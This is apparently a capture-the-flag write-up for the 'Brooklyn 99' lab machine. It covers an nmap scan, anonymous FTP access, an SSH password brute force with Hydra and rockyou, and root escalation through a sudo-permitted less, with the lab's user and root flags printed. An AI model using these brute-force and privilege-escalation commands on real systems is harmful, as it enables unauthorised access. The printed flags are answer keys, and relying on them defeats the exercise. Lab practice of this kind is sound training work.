# Brooklyn 99

Notes from the CTF!

## Recon

### nmap

`└─# nmap -A 10.10.255.152`

```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-19 16:23 UTC
Nmap scan report for ip-10-10-255-152.eu-west-1.compute.internal (10.10.255.152)
Host is up (0.00062s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.53.16
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 167f2ffe0fba98777d6d3eb62572c6a3 (RSA)
|   256 2e3b61594bc429b5e858396f6fe99bee (ECDSA)
|_  256 ab162e79203c9b0a019c8c4426015804 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.29 (Ubuntu)
MAC Address: 02:72:96:D5:C3:57 (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=7/19%OT=21%CT=1%CU=43981%PV=Y%DS=1%DC=D%G=Y%M=027296%T
OS:M=64B80E17%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=10B%TI=Z%CI=Z%II=I
OS:%TS=A)OPS(O1=M2301ST11NW7%O2=M2301ST11NW7%O3=M2301NNT11NW7%O4=M2301ST11N
OS:W7%O5=M2301ST11NW7%O6=M2301ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F
OS:4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M2301NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T
OS:=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R
OS:%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=
OS:40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0
OS:%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R
OS:=Y%DFI=N%T=40%CD=S)

Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.62 ms ip-10-10-255-152.eu-west-1.compute.internal (10.10.255.152)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.66 seconds
```

### FTP

`─# ftp 10.10.255.152`

```
Connected to 10.10.255.152.
220 (vsFTPd 3.0.3)
Name (10.10.255.152:root): anonymous
331 Please specify the password.
Password: anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||19054|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
226 Directory send OK.
ftp> get note_to_jake.txt
local: note_to_jake.txt remote: note_to_jake.txt
229 Entering Extended Passive Mode (|||43280|)
150 Opening BINARY mode data connection for note_to_jake.txt (119 bytes).
100% |**********************************************************************************************************************************|   119       32.58 KiB/s    00:00 ETA
226 Transfer complete.
119 bytes received in 00:00 (28.44 KiB/s)
```

`└─# cat note_to_jake.txt`

```
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
```
## User level access

### Hydra 

`└─# hydra -t 4 -l jake -P /usr/share/wordlists/rockyou.txt 10.10.255.152 ssh`

```
[22][ssh] host: 10.10.255.152   login: jake   password: 987654321
```

### SSH
`└─# ssh jake@10.10.255.152` and I am in the system.

`ee11cbb19052e40b07aac0ca060c23ee` is our user flag.


## Getting root

`jake@brookly_nine_nine:~$ sudo -l`

```
User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
```

https://gtfobins.github.io/gtfobins/less/

```
sudo less /etc/profile
!/bin/sh
```

`#` And that's it! Now we can find `root.txt`

```
-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: 63a9f0ea7bb98050796b649e85481845

Enjoy!!
```

It looked like they hid something with steganography in the website image as well. Proof left to the reader :)
